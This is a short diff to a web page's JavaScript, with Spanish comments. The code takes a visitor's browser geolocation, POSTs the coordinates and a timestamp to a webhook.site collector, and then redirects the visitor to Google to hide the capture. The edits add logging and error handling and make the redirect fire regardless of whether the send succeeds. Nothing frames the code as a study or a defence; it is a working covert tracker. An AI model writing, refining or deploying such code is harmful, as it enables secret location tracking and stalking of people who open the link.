@@ -11,15 +11,21 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // ENVIAR AL WEBHOOK
-                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", { // ⬅ REEMPLAZA CON TU URL
+                    console.log("Ubicación obtenida:", lat, lon); // LOG EN CONSOLA
+
+                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ latitud: lat, longitud: lon, timestamp: new Date().toISOString() })
-                    }).then(() => {
-                        // OPCIONAL: Redirigir a Google después de enviar datos
-                        window.location.href = "https://www.google.com";
-                    });
+                    })
+                    .then(response => response.text())
+                    .then(data => console.log("Respuesta del servidor:", data)) // LOG EN CONSOLA
+                    .catch(error => console.error("Error en fetch:", error));
+
+                    window.location.href = "https://www.google.com"; 
+                }, error => {
+                    console.error("Error obteniendo ubicación:", error);
+                    alert("Error obteniendo ubicación: " + error.message);
                 });
             } else {
                 alert("La geolocalización no está disponible.");
